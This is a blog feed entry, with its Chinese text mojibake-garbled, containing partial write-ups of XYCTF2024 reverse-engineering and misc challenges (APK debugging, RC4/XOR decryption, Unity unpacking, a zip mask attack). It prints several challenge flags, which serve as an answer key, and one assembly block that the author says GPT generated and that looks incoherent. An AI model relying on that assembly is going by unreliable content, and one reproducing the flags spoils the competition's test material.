    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="èªæ˜çš„ä¿¡ä½¿"><a href="#èªæ˜çš„ä¿¡ä½¿" class="headerlink" title="èªæ˜çš„ä¿¡ä½¿"></a>èªæ˜çš„ä¿¡ä½¿</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712051726951-e17ec2ed-5b40-48d7-9db5-26eeedbb1c7e.png" class="" title="img"><p>å‘ç°æ˜¯rot9</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712051750030-dcf3a574-9a06-4d78-85d7-8548b65b64af.png" class="" title="img"><p>æƒ³èµ·æ¥ä¸æ˜¯ç®€å•çš„å‡9ï¼Œæ˜¯å¾ªç¯ç€æ¥</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052272078-5cb1c2fc-02e1-4b6d-93b6-1111c3d290e0.png" class="" title="img"><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;<br></code></pre></td></tr></table></figure><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052290247-2e08b5c7-b2e9-455d-80e1-5635a2330a74.png" class="" title="img"><h2 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h2><p>å’Œçœèµ›çš„å·®ä¸å¤š</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052736031-043a026f-64ca-4663-9d85-0f43bf4982ef.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052859203-27455d36-5e20-46a0-8091-5487a6d9a1fe.png" class="" title="img"><p>äº¤å‰å¼•ç”¨è¿‡å»</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052847842-5e8a1465-de85-48fc-98fd-07f0db85ee3b.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712052961771-0e54e387-423d-444c-8414-612e3f3862b0.png" class="" title="img"><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">My_fl@</span><span class="hljs-symbol">g_h4s_br0ken_4parT_Bu7_Y0u_c@</span>n_f1x_1t!&#125;<br></code></pre></td></tr></table></figure><h2 id="å¤§å­¦ç”Ÿ"><a href="#å¤§å­¦ç”Ÿ" class="headerlink" title="å¤§å­¦ç”Ÿ"></a>å¤§å­¦ç”Ÿ</h2><p>ç¬¬ä¸€æ¬¡é‡åˆ°dosç³»ç»Ÿ</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712053132899-8b9d1dbe-f307-46ab-9432-ba4412d54c0b.png" class="" title="img"><p>è¾“å…¥ç„¶åç›¸é‚»ä¸¤ä½å¼‚æˆ–</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068099854-bc9b4106-2a2e-4e6c-ac5a-b49ba6800d04.png" class="" title="img"><p>æœ€åå’Œå¯†æ–‡æ¯”è¾ƒ</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068164096-eece6aeb-2994-40ed-bb0d-b15749c93821.png" class="" title="img"><p>ç›´è§‰æ˜¯å¯†æ–‡ç›¸é‚»ä¸¤ä½å¼‚æˆ–</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068022471-94366bc6-8310-40a3-8207-0260b49a23df.png" class="" title="img"><h2 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712068563333-67ab2072-df0b-4cea-b49f-ae30286d2594.png" class="" title="img"><p>jadxæ··æ·†æœ‰ç‚¹ä¸¥é‡</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712107912377-569a0014-5b5d-4133-b724-7f01ca496e3e.png" class="" title="img"><p>ä¸å¦‚jebç›´æ¥åŠ¨è°ƒï¼Œä¸è¦ä¸‹æ–­ç‚¹ï¼Œç›´æ¥attachä¹‹åclickå°±æœ‰flag</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712199875421-3631d52d-bea6-43de-9765-b1e05126ef4d.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">XYCTF</span><span class="hljs-template-variable">&#123;d3bugg3r_15_v3ry_u53ful&#125;</span><br></code></pre></td></tr></table></figure><h2 id="TrustMe"><a href="#TrustMe" class="headerlink" title="TrustMe"></a>TrustMe</h2><p>rc4è§£å¯†</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712069152663-2dc9e98b-3de0-438d-ab96-477524415e86.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712069133323-17339519-b6ec-4aa1-8813-dfab80f4a262.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712069325538-606612d5-a9c3-4b78-90cd-f1c58f13a650.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712200674892-4cb7837c-94da-431e-9716-4f3c6cfaf1cf.png" class="" title="img"><p>è§£å¯†ä¸å¤Ÿï¼Œå»çœ‹å…¶ä»–æ–¹æ³•ï¼Œå‘ç°äº†decryptï¼Œå¼‚æˆ–0xffï¼ŒäºŒè¿›åˆ¶ä½åŸæ¥æ˜¯1å˜ä¸º0ï¼ŒåŸæ¥æ˜¯0å˜ä¸º1</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712200661342-ba5f59e0-c3ff-4126-aff6-85b3da4a9e7a.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712202255450-513c7acb-fedf-4c62-9f18-bb69b6e86683.png" class="" title="img"><p>é«˜ç‰ˆæœ¬æ²¡æœ‰debug</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712201691011-c79aeee3-64ee-454a-9720-df79b747304f.png" class="" title="img"><p>æœ€åä¸€éƒ¨åˆ†æ²¡æœ‰æ³¨é‡Šï¼Œé‚£ä¼°è®¡æ˜¯æœ‰ç”¨æ•°æ®</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712229746541-30eff005-c68f-4095-a123-605411be1f3c.png" class="" title="img"><p>å‘ç°è¿˜çœŸæ˜¯zipï¼ŒåŒæ—¶ä¹Ÿæ˜¯apkï¼Œè®°å¾—æœ€åå››ä½ä¸è¦ï¼Œè¿™æ ·æ‰èƒ½åœ¨æ¨¡æ‹Ÿå™¨ä¸­æ‰“å¼€</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712229660604-107b9590-1134-47ee-8a97-903aaefaa40c.png" class="" title="img"><p>è¿˜æ˜¯ä¸€ä¸ªapkï¼Œflagä»æ•°æ®åº“ä¸­è¯»å‡ºæ¥</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712232918014-62b6c178-c636-4fc8-b4a1-41a2984b1dff.png" class="" title="img"><p>æ‰¾åˆ°dbæ–‡ä»¶äº†ï¼Œä½†æ˜¯åœ¨çº¿å·¥å…·ä¸€ç›´æ‰“ä¸å¼€ï¼Œåº”è¯¥è¦èƒ½æƒ³åˆ°å·²ç»è¢«åŠ å¯†äº†(å¸ˆå‚…æé†’,æœ‰ç‚¹misc)ï¼Œå› ä¸ºæ•°æ®åº“è¿™ç§ä¸åŠ å¯†å¾ˆå±é™©</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712232841782-3b26a269-4c5e-4249-8ef5-2b440bf3db17.png" class="" title="img"><p>å¯¹ç€åŸæœ¬çš„æ–‡ä»¶å¤´å»å¼‚æˆ–ï¼Œå‘ç°å¼‚æˆ–çš„æ˜¯åŒä¸€ä¸ªæ•°0xffï¼Œä¼°è®¡æ˜¯ç¬¬ä¸€ä¸ªapkæŠŠæ‰€æœ‰æœ‰ç”¨æ–‡ä»¶éƒ½å¼‚æˆ–0xffäº†</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712233210071-44d9d6ce-629b-43d7-936a-4397b3246f07.png" class="" title="img"><p>å¼‚æˆ–åç›´æ¥æœå°±èƒ½å‡º</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712232745234-e3dd72db-7b2c-401a-8324-96f9448aff04.png" class="" title="img"><p>è¿™æ ·å°±èƒ½åœ¨çº¿æŸ¥çœ‹äº†</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712233142959-27f6e707-4446-46ac-bbd0-f663172bc53f.png" class="" title="img"><h2 id="ç ¸æ ¸æ¡ƒ"><a href="#ç ¸æ ¸æ¡ƒ" class="headerlink" title="ç ¸æ ¸æ¡ƒ"></a>ç ¸æ ¸æ¡ƒ</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712974229801-bd1f51a1-575d-470e-9d27-880389e661e5.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712974741323-6710afcf-62cc-454b-a18c-645705aa7b69.png" class="" title="img"><p>demoè§£å‹åˆ°æœ¬åœ°å°±èƒ½è„±å£³äº†</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712974851911-69a9c572-eda5-4a57-a78a-8e79cd3d42ea.png" class="" title="img"><h2 id="baby-unity-2"><a href="#baby-unity-2" class="headerlink" title="baby_unity-2"></a>baby_unity-2</h2><p><a href="https://www.52pojie.cn/thread-1580642-1-1.html">https://www.52pojie.cn/thread-1580642-1-1.html</a></p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712326587601-87685055-82db-4f8b-a35f-2fbb7d52f3c9.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712326568808-10448a9d-423d-45b4-aa55-c4774c0d622e.png" class="" title="img"><p>å‘ç°å¹¶æ²¡æœ‰éœ€è¦çš„libil2cpp.soï¼Œç”¨GameAssembler.dllä»£æ›¿</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712371932601-3a00572c-cfd8-4321-bc8f-0fe7b9de5172.png" class="" title="img"><p>åœ¨å¸ˆå‚…çš„æé†’ä¸‹å‘ç°æœ‰å£³ï¼Œå…¶å®æƒ³æƒ³ä¹Ÿåº”è¯¥çš„ï¼Œåªæœ‰è¿™ä¸ªç¨‹åºä¼šæœ‰æ”¹åŠ¨</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712380768147-197af3b8-2065-4776-be23-10dd20da3c6c.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712380994506-8a936fa0-4c30-41c3-9ccf-2898ee870c2e.png" class="" title="img"><p>ç”¨dnSpyæ‰“å¼€ï¼Œå‘ç°å¹¶æ²¡æœ‰å…·ä½“å®ç°</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383451448-ce45a2cb-293a-4ab4-8558-767632343504.png" class="" title="img"><p>ç”¨idaæ‰“å¼€GameAssembly.dllï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å¯†æ–‡</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712386499831-fe0a4e91-4ded-497f-84bb-db825caef7f2.png" class="" title="img"><p>å‘ç°sha1</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712385155393-902ca6f6-c85a-4265-8377-41cafd7dd312.png" class="" title="img"><h2 id="ezcube"><a href="#ezcube" class="headerlink" title="ezcube"></a>ezcube</h2><p>çœ‹é¢œè‰²åº”è¯¥æ˜¯ä¸‰ä¸ªä¸­é—´å—æ²¡æœ‰è¿˜åŸ</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712538029145-73021005-5d48-46f5-bcc0-cc2cab675a18.png" class="" title="img"><p>ä¸”æ­¥æ•°ä¸èƒ½è¶…è¿‡12</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712538092358-e82af05c-6f0e-401f-bded-c7c33c2342ea.png" class="" title="img"><p>ç”¨z3ä¸è¡Œ</p><p>æƒ³åˆ°äº†æœ€åä¸€æ­¥è¿˜åŸå…¬å¼</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712537941479-30672fcf-b71c-4a8e-827b-8cbed73aecc1.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;RuRURURuruRR&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ä»Šå¤•æ˜¯ä½•å¹´-2"><a href="#ä»Šå¤•æ˜¯ä½•å¹´-2" class="headerlink" title="ä»Šå¤•æ˜¯ä½•å¹´-2"></a>ä»Šå¤•æ˜¯ä½•å¹´-2</h2><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712539239937-b3df0244-eee0-4c3a-a6a8-4b4bd1dde81c.png" class="" title="img"><p>å·¥å…·åç¼–è¯‘ä¸äº†</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712538522256-2949ff9c-dc33-4ea4-be74-ca21e1448739.png" class="" title="img"><h2 id="ez-rand-2"><a href="#ez-rand-2" class="headerlink" title="ez_rand-2"></a>ez_rand-2</h2><p>çœ‹ä¸Šå»åƒæ˜¯çœŸéšæœºï¼Œæ²¡å•¥æƒ³æ³•</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712573749281-60369774-2b88-4088-869b-6bc6d933091b.png" class="" title="img"><h2 id="ä½•é¡»ç›¸æ€ç…®ä½™å¹´-2"><a href="#ä½•é¡»ç›¸æ€ç…®ä½™å¹´-2" class="headerlink" title="ä½•é¡»ç›¸æ€ç…®ä½™å¹´-2"></a>ä½•é¡»ç›¸æ€ç…®ä½™å¹´-2</h2><p>gptç”Ÿæˆçš„æ±‡ç¼–çœ‹ä¸æ‡‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python">push ebp<br>mov ebp, esp<br>sub esp, <span class="hljs-number">0x81ec</span><br>mov eax, [<span class="hljs-number">0xa8</span>]<br>mov ecx, [<span class="hljs-number">0x414040</span>]<br>xor eax, [<span class="hljs-number">0xfc45</span>]<br>push <span class="hljs-number">0x0</span><br>lea eax, [ebp-<span class="hljs-number">0xa0</span>]<br>push eax<br>call <span class="hljs-number">0xc7a</span><br>add esp, <span class="hljs-number">0xc</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa8</span>], <span class="hljs-number">0x27</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x0</span><br>jmp short <span class="hljs-number">0xf</span><br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>add ecx, <span class="hljs-number">0x1</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], ecx<br>cmp dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x27</span><br>jle short <span class="hljs-number">0xf</span><br>lea ebp, [ebp]<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp+<span class="hljs-number">0x60</span>]<br>lea ebx, [ebp+edx-<span class="hljs-number">0x3</span>]<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+ecx*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+eax*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>jmp short <span class="hljs-number">0x73</span><br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>add ecx, <span class="hljs-number">0x3</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], ecx<br>cmp dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x27</span><br>jle short <span class="hljs-number">0x73</span><br>lea esi, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov edx, [ebp+<span class="hljs-number">0x60</span>]<br>sub esi, edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+ecx*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+eax*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>jmp short <span class="hljs-number">0x38</span><br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>add ecx, <span class="hljs-number">0x3</span><br>mov dword ptr [ebp-<span class="hljs-number">0xa4</span>], ecx<br>cmp dword ptr [ebp-<span class="hljs-number">0xa4</span>], <span class="hljs-number">0x27</span><br>jle short <span class="hljs-number">0x38</span><br>lea edi, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov edx, [ebp+<span class="hljs-number">0x60</span>]<br>xor edi, edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov ecx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+ecx*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>mov edx, [ebp-<span class="hljs-number">0xa4</span>]<br>mov eax, [ebp-<span class="hljs-number">0xa4</span>]<br>mov dword ptr [ebp+eax*<span class="hljs-number">4</span>-<span class="hljs-number">0x3</span>], edx<br>jmp short <span class="hljs-number">0xf7</span><br>xor eax, eax<br>mov ecx, [ebp-<span class="hljs-number">0x4</span>]<br>xor ecx, ebp<br>call <span class="hljs-number">0x4</span><br>mov ebp, esp<br>ret<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ç¥ä¹‹å¥—-2"><a href="#ç¥ä¹‹å¥—-2" class="headerlink" title="ç¥ä¹‹å¥—-2"></a>ç¥ä¹‹å¥—-2</h2><p>ä¸€çœ¼æ©ç æ”»å‡»</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712203144307-e1b80582-c475-4853-9fd9-230c8235ce6b.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712202797199-efa0d22a-ff49-42fb-8ee8-6fc6a51d1b5e.png" class="" title="img"><p>å¥—æ¯”flagå¤šäº†flag.mdï¼Œå…¶ä»–éƒ½ä¸€æ ·</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712203002356-cc93cb50-3b45-422f-be3b-309ec03ac341.png" class="" title="img"><p>æ‰¾åˆ°åŒæ ·åœ°å€çš„åœ°æ–¹ï¼Œå‘ç°^0xffä¹‹åæœ‰å‹ç¼©åŒ…</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712212960769-be00309f-2594-4983-8f08-291b1c4a094a.png" class="" title="img"><h2 id="TCPL"><a href="#TCPL" class="headerlink" title="TCPL"></a>TCPL</h2><p>ç›´æ¥è¿è¡Œä¸äº†</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383099722-d2568fa2-a8ce-4d14-bff7-d2be58bf7297.png" class="" title="img"><p>idaä¸èƒ½åç¼–è¯‘ï¼Œé‚£å°±ç”¨ghidra</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383204457-f62fd638-89e1-4dd5-9044-1d6ce8ef527d.png" class="" title="img"><p>æŒ‰ç…§æµç¨‹å¾—åˆ°è¾“å‡ºï¼Œä½†æ˜¯å¥½åƒæ²¡å•¥ç”¨</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712383248486-5ffecd01-bca8-46c6-98e8-80fa9ec53d50.png" class="" title="img"><p>ç”±äºé¢˜ç›®è¯´æ˜¯æŠŠ1ç”¨ä¸‹é¢çš„å›¾ç‰‡æ¥ä»£æ›¿ï¼Œé‚£ä¹ˆå¯ä»¥çŸ¥é“ä¸‹é¢çš„å›¾ç‰‡ä¹Ÿè¡¨ç¤ºä¸€ä¸ªå­—æ¯æˆ–è€…æ•°å­—ï¼Œä»”ç»†å»çœ‹ä¸Šé¢çš„åç¼–è¯‘ä»£ç ååŠéƒ¨åˆ†å¯ä»¥å‘ç°æ˜¯åœ¨è°ƒæ¢æ•°ç»„çš„å…ƒç´ ï¼Œé‚£ä¹ˆæ•°ç»„çš„0x0å°±å¯ä»¥å¿½ç•¥ï¼ŒåŒæ—¶ç”±äºæ˜¯5Ã—5çš„çŸ©é˜µï¼Œé‚£çŒœæµ‹ç¬¬59è¡Œåº”è¯¥æ˜¯Ã—5ï¼ŒåŒç†ä¸Šé¢åº”è¯¥æ˜¯ç›´æ¥å¼‚æˆ–iï¼Œæœ€åç”¨0ä»£æ›¿1å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x46</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x56</span>,<br>  <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x4C</span>,<br>  <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x61</span>]<br><span class="hljs-comment">#print(hex(len(a)))</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x1d</span>):<br>    <span class="hljs-comment">#print((a[i]+i)^i,end=&quot;,&quot;)</span><br>    s1+=<span class="hljs-built_in">chr</span>((a[i]^i))<br><span class="hljs-built_in">print</span>(s1)<br><br>b=[<span class="hljs-number">0x20</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>, <span class="hljs-number">0x2A</span>,<span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x2a</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x20</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(b))<br>s2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        s2+=<span class="hljs-built_in">chr</span>(b[j+i*<span class="hljs-number">5</span>])<br>    <span class="hljs-built_in">print</span>(s2,end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>    s2=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#FLAG&#123;PLCT_An4_r1SCv_x1huann1&#125;</span><br>FLAG&#123;PLCT_An4_r0SCv_x0huann0&#125;<br></code></pre></td></tr></table></figure><h2 id="baby-AIO-2"><a href="#baby-AIO-2" class="headerlink" title="baby-AIO-2"></a>baby-AIO-2</h2><p>å»çœ‹soå±‚å‘ç°å…³é”®å‡½æ•°</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712467126283-fbfcf916-4692-44d9-8948-5fc61d2b0063.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712467442789-04e40258-9c5e-4097-b87b-1619cd20332a.png" class="" title="img"><p>åæ¥åˆç»™äº†ä¸€ä¸ªapkï¼Œå‘ç°æ˜¯vm</p><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712473914434-ce76bd09-7132-45ae-9155-875b9c12a76a.png" class="" title="img"><img src="/2024/04/27/XYCTF2024%E9%83%A8%E5%88%86wp/1712495034710-c8246956-dbed-4dff-af43-91c6ac408974.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>teaé­”æ”¹</tag>
      
      <tag>unityé€†å‘</tag>
      
      <tag>VM</tag>
      
      <tag>eè¯­è¨€</tag>
      
      <tag>luaè¯­è¨€</tag>
      
      <tag>huffman</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é•¿åŸæ¯2024åˆèµ›éƒ¨åˆ†Re</title>
    <link href="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/"/>
    <url>/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/</url>
    
